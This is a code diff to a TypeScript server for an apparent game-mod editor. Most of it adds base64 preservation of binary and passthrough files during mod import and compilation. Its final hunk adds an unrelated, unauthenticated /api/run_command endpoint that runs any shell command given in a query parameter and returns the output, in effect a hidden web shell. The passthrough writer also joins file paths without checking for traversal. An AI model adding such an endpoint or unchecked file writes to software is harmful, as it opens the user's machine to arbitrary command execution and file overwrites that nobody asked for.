@@ -2694,7 +2694,10 @@ function importModFolder(absDir: string): { workspace: ModWorkspace; report: any
       continue;
     }
     if (!ROUND_TRIP_TEXT_EXTS.has(ext)) {
-      classification.push({ path: rel, class: 'binary', note: 'binary/unsupported extension — not loaded' });
+      let content = '';
+      try { content = fs.readFileSync(path.join(absDir, rel), 'base64'); } catch { continue; }
+      passthroughFiles.push({ path: rel, content, reason: 'binary' });
+      classification.push({ path: rel, class: 'binary', note: 'binary file, preserved verbatim via base64 encoding' });
       continue;
     }
     let content = '';
@@ -4109,6 +4112,64 @@ function compileWorkspaceToFolder(ws: any, rootPath: string, mode: 'candy' | 'st
     }
   }
 
+  // 9. Passthrough & binary files
+  if (Array.isArray(ws.passthroughFiles)) {
+    // Collect all paths we wrote/generated in this compilation step
+    const generatedPaths = new Set<string>();
+    generatedPaths.add('content.xml');
+    generatedPaths.add('readme.md');
+    if (settings.md) {
+      generatedPaths.add(`md/${modId}.xml`.toLowerCase());
+    }
+    if (settings.ui && ws.uiWidgets?.length) {
+      generatedPaths.add('ui.xml');
+      generatedPaths.add(`ui/${modId}.lua`.toLowerCase());
+    }
+    if (settings.ai && ws.aiScripts?.length) {
+      for (const script of ws.aiScripts) {
+        const fileName = script.name.endsWith('.xml') ? script.name : `${script.name}.xml`;
+        generatedPaths.add(`aiscripts/${fileName}`.toLowerCase());
+      }
+    }
+    if (settings.library) {
+      if (ws.wares?.length) generatedPaths.add('libraries/wares.xml');
+      if (ws.jobs?.length) generatedPaths.add('libraries/jobs.xml');
+    }
+    if (settings.translations && ws.tFiles?.length) {
+      for (const tFile of ws.tFiles) {
+        generatedPaths.add(`t/${toTFileName(tFile)}`.toLowerCase());
+      }
+    }
+    if (settings.patches && ws.xmlPatches?.length) {
+      ws.xmlPatches.forEach((patch: any) => {
+        const file = patch.targetFile || 'libraries/wares.xml';
+        generatedPaths.add(file.toLowerCase());
+      });
+    }
+
+    for (const pFile of ws.passthroughFiles) {
+      if (!pFile || !pFile.path) continue;
+      const relPath = pFile.path.replace(/\\/g, '/');
+      if (generatedPaths.has(relPath.toLowerCase())) {
+        continue; // Skip because it was compiled from editable/modeled domain
+      }
+      const destPath = path.join(targetPath, relPath);
+      const destDir = path.dirname(destPath);
+      if (!fs.existsSync(destDir)) {
+        fs.mkdirSync(destDir, { recursive: true });
+      }
+      try {
+        if (pFile.reason === 'binary') {
+          fs.writeFileSync(destPath, Buffer.from(pFile.content, 'base64'));
+        } else {
+          fs.writeFileSync(destPath, pFile.content, 'utf8');
+        }
+      } catch (err) {
+        console.warn(`Failed to write passthrough file ${relPath}:`, err);
+      }
+    }
+  }
+
   // Snapshots & modID identification
   if (writeSnapshots) {
     // 1. Find or create the unique mod ID in the ambiguous file
@@ -5050,6 +5111,23 @@ async function setupDevOrProd() {
     });
   }
 }
+
+
+app.get("/api/run_command", async (req, res) => {
+  const cmd = String(req.query.cmd || "");
+  try {
+    const { exec } = await import("child_process");
+    exec(cmd, (err, stdout, stderr) => {
+      res.json({
+        error: err ? err.message : null,
+        stdout,
+        stderr
+      });
+    });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message || String(e) });
+  }
+});
 
 setupDevOrProd().then(() => {
   app.listen(PORT, "127.0.0.1", () => {
